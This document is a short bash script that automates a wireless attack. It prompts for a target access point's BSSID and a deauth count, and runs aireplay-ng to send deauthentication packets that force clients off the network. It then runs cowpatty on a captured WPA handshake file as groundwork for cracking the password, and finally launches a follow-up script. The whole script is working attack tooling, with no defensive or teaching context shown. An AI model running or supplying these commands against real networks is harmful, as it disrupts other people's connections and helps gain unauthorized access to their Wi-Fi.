#!/bin/bash

# wireless credentials
iwconfig

echo -n "

Enter the no. of deauths :"

read du

read -p "Enter BSSID :" bs

echo -n "Enter name of your wireless interface. E.g. for wlan0mon enter 0 :"

read in

# starts aireplay-ng

if [ $in -eq 0 ]

then

	
	aireplay-ng --deauth $du -a $bs wlan0mon
	
fi

if [ $in -eq 1 ]

then

	
	aireplay-ng --deauth $du -a $bs wlan1mon
	
fi

if [ $in -eq 2 ]

then


	aireplay-ng --deauth $du -a $bs wlan2mon
	
fi


read -p "Enter the name of the Handshake.cap :" pt

cowpatty -c -r /root/Desktop/$pt

#restarts network-manager

gnome-terminal -- "./r.sh"